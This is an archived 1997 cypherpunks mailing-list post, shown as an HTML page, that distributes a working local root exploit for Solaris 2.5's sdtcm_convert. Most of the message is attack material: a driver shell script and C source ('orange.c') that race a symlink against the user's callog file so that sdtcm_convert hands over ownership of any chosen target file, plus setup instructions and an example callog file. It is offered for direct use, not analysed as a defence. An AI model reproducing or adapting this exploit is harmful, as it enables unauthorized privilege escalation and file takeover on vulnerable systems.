@@ -1,0 +1,207 @@
+<!-- MHonArc v2.4.3 -->
+<!--X-Subject: Exploit for sdtcm_convert &#45; Solaris 2.5 &#45; second -->
+<!--X-From-R13: Qevfgvna EQVWBAD <fxvcbNfhaql.pf.cho.eb> -->
+<!--X-Date: Sun, 23 Feb 1997 01:21:50 &#45;0800 (PST) -->
+<!--X-Message-Id: Pine.GSO.3.95.970223111505.1649C&#45;100000@sundy.cs.pub.ro -->
+<!--X-Content-Type: text/plain -->
+<!--X-Head-End-->
+<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML//EN">
+<HTML>
+<HEAD>
+<TITLE>Exploit for sdtcm_convert - Solaris 2.5 - second</TITLE>
+<LINK REV="made" HREF="mailto:skipo@sundy.cs.pub.ro">
+</HEAD>
+<BODY>
+<!--X-Body-Begin-->
+<!--X-User-Header-->
+<!--X-User-Header-End-->
+<!--X-TopPNI-->
+<HR>
+[<A HREF="msg02619.html">Date Prev</A>][<A HREF="msg02622.html">Date Next</A>][<A HREF="msg02618.html">Thread Prev</A>][<A HREF="msg02626.html">Thread Next</A>][<A HREF="index.html#02624">Date Index</A>][<A HREF="threads.html#02624">Thread Index</A>]
+<!--X-TopPNI-End-->
+<!--X-MsgBody-->
+<!--X-Subject-Header-Begin-->
+<H1>Exploit for sdtcm_convert - Solaris 2.5 - second</H1>
+<HR>
+<!--X-Subject-Header-End-->
+<!--X-Head-of-Message-->
+<UL>
+<LI><em>To</em>: <A HREF="mailto:cypherpunks@toad.com">cypherpunks@toad.com</A></LI>
+<LI><em>Subject</em>: Exploit for sdtcm_convert - Solaris 2.5 - second</LI>
+<LI><em>From</em>: Cristian SCHIPOR &lt;<A HREF="mailto:skipo@sundy.cs.pub.ro">skipo@sundy.cs.pub.ro</A>&gt;</LI>
+<LI><em>Date</em>: Sun, 23 Feb 1997 11:15:48 +0200 (EET)</LI>
+<LI><em>Sender</em>: <A HREF="mailto:owner%2Dcypherpunks@toad.com">owner-cypherpunks@toad.com</A></LI>
+</UL>
+<!--X-Head-of-Message-End-->
+<!--X-Head-Body-Sep-Begin-->
+<HR>
+<!--X-Head-Body-Sep-End-->
+<!--X-Body-of-Message-->
+<PRE>
+
+Sun Feb 23 10:36:58 EET 1997 Romania
+
+"Exploit for sdtcm_convert - Solaris 2.5"
+
+I send you an e-mail about a bug and an exploit for sdtcm_convert.
+(sdtcm_convert allows you to become owner of any file or directory from
+the system - and gain root access )
+
+First, there was some problems with my uuencoded exploit (some damaged it
+on the route...) so i'll resend you the files for exploit.
+
+Second, Casper Dick send me:
+
+&gt;Is this the bug fixed in the Sun patches:
+
+&gt;103670-02: CDE 1.0.2: sdtcm_convert has a security vulnerability
+&gt;103671-02: CDE 1.0.1: sdtcm_convert has a security vulnerability
+&gt;103717-02: CDE 1.0.2: sdtcm_convert has a security vulnerability (x86
+version)
+&gt;103718-02: CDE 1.0.1: sdtcm_convert has a security vulnerability (x86
+version)
+
+
+&gt;or is it a new one?
+
+&gt;Casper
+
+I cant found this patches to verify if that fix the problem i have
+found or not. Anyway you have an exploit ! (execute 'thefist' and wait)
+
+Cristian Schipor - Computer Science Faculty - Bucharest - Romania
+
+Email: skipo@math.pub.ro skipo@sundy.cs.pub.ro skipo@ns.ima.ro
+Phone: (401) 410.60.88
+
+
+------------------------- file thefirst ------------------------------------
+/bin/echo "orange.c -&gt; orange"
+gcc -o orange orange.c
+
+/usr/ucb/whoami &gt; wh
+read USER &lt; ./wh
+
+#watching for callog file if it isnt will stop
+if ! test -f /var/spool/calendar/callog.$USER; then
+  /bin/echo "I cant found callog file. Please read README and create it"
+  exit;
+fi
+
+/bin/echo "what's the target ???"
+read TARGET
+
+/bin/echo /bin/chmod 000 /var/spool/calendar/callog.$USER &gt;lemon
+/bin/echo /usr/dt/bin/sdtcm_convert $USER &gt;&gt;lemon
+/bin/chmod 700 ./lemon
+
+./orange $TARGET $USER
+
+------------------------- end --------------------------
+------------------------ file orange.c ---------------------------
+#include &lt;stdio.h&gt;
+#include &lt;sys/types.h&gt;
+#include &lt;sys/stat.h&gt;
+#include &lt;unistd.h&gt;
+
+#define path  "/var/spool/calendar/callog."
+
+
+void main(int argc, char *argv[])
+{
+int pid,filedes[2];
+FILE *f;
+struct stat info;
+long i;
+char target[128],shift[128];
+	
+	strcpy(target,argv[1]);
+	strcpy(shift,path);
+	strcat(shift,argv[2]);
+	if(pipe(filedes))
+	{
+		perror("cant crate pipe\n");
+		exit(0);
+	}	
+	if(pid=fork()==0)
+	{
+		for(i=0;i&lt;30000000;i++);
+		unlink(shift);
+		symlink(target,shift);
+		write(filedes[1],"y\n",sizeof("y\n"));
+	}				
+	else 
+	{
+		close(0);
+		dup(filedes[0]);
+		system("lemon");
+		stat(target,&amp;info);
+		if(info.st_uid==getuid()) printf("COLL I did IT !!!\n");
+	}
+	
+}
+
+------------------------ end ----------------------------
+------------------------ file README ----------------------
+*How to make a simple callog file*
+
+If you dont have a /var/spool/calendar/callog.YOU edit callog.example,
+replace 'skipo' with your user name and 'sundy.cs.pub.ro' with your
+machine name (try first the short name, example: sundy and if you'll have
+troubleshotings try the long name, example sundy.cs.pub.ro). After that
+copy the new callog file in /var/spool/calendar/callog.YOUR_USER_NAME, run
+once sdtcm_convert with your user name (example sdtcm_convert skipo)
+and wait for corrections. Now you are ready to run the exploit.
+Another way is to run calendar tool from CDE.
+------------------------- end -------------------------------
+------------------------ file callog.example ------------------------
+Version: 4
+**** start of log on Fri Dec  6 14:07:43 1996 ****
+
+(calendarattributes ("-//XAPIA/CSA/CALATTR//NONSGML Access List//EN","10:access_list","world:2")
+("-//XAPIA/CSA/CALATTR//NONSGML Calendar Name//EN","5:string","skipo@sundy.cs.pub.ro")
+("-//XAPIA/CSA/CALATTR//NONSGML Calendar Owner//EN","6:user","skipo@sundy.cs.pub.ro")
+("-//XAPIA/CSA/CALATTR//NONSGML Character Set//EN","5:string","C.ISO-8859-1")
+("-//XAPIA/CSA/CALATTR//NONSGML Date Created//EN","7:date_time","19961206T120743Z")
+("-//XAPIA/CSA/CALATTR//NONSGML Product Identifier//EN","5:string","-//DT//NONSGML Calendar Product Version 1//EN")
+("-//XAPIA/CSA/CALATTR//NONSGML Version//EN","5:string","-//XAPIA/CSA/VERSION1/NONSGML CSA Version 1//EN")
+)
+-------------------------- end --------------------------------
+
+
+</PRE>
+
+<!--X-Body-of-Message-End-->
+<!--X-MsgBody-End-->
+<!--X-Follow-Ups-->
+<HR>
+<!--X-Follow-Ups-End-->
+<!--X-References-->
+<!--X-References-End-->
+<!--X-BotPNI-->
+<UL>
+<LI>Prev by Date:
+<STRONG><A HREF="msg02619.html">Re: Dark Times Ahead</A></STRONG>
+</LI>
+<LI>Next by Date:
+<STRONG><A HREF="msg02622.html">Re: Dark Times Ahead</A></STRONG>
+</LI>
+<LI>Prev by thread:
+<STRONG><A HREF="msg02618.html">Low-Risk Remailer Proposal</A></STRONG>
+</LI>
+<LI>Next by thread:
+<STRONG><A HREF="msg02626.html">CIA Lie</A></STRONG>
+</LI>
+<LI>Index(es):
+<UL>
+<LI><A HREF="index.html#02624"><STRONG>Date</STRONG></A></LI>
+<LI><A HREF="threads.html#02624"><STRONG>Thread</STRONG></A></LI>
+</UL>
+</LI>
+</UL>
+
+<!--X-BotPNI-End-->
+<!--X-User-Footer-->
+<!--X-User-Footer-End-->
+</BODY>
+</HTML>
